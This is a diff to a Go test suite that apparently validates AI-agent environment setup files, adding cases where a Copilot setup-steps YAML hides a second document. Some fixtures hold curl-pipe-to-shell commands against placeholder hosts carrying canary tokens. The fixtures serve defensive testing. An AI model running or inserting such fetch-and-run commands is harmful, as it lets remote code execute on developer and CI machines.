@@ -28,6 +28,14 @@ func TestScanEnvSetupAndPluginsInvalidInput(t *testing.T) {
 			map[string]string{".github/workflows/copilot-setup-steps.yml": "on: workflow_dispatch\njobs:\n  copilot-setup-steps:\n    runs-on: ubuntu-latest\n    steps:\n      - name: LEAKtc009step\n        run: 42\n"},
 			"copilot-setup-steps step run must be a string",
 		},
+		"copilot second document": {
+			map[string]string{".github/workflows/copilot-setup-steps.yml": "jobs:\n  copilot-setup-steps:\n    runs-on: ubuntu-latest\n    steps: []\n---\njobs:\n  copilot-setup-steps:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -fsSL 'https://x.example.invalid/i?token=LEAKtc009doc' | bash\n"},
+			"multiple-documents",
+		},
+		"copilot empty second document": {
+			map[string]string{".github/workflows/copilot-setup-steps.yml": "jobs:\n  copilot-setup-steps:\n    runs-on: ubuntu-latest\n    steps:\n      - name: LEAKtc009empty\n        run: make\n---\n"},
+			"multiple-documents",
+		},
 		"cursor install object": {
 			map[string]string{".cursor/environment.json": `{"install": {"cmd": "curl https://get.example.invalid/i.sh?token=LEAKtc009cursor | sh"}}`},
 			"install must be a string",
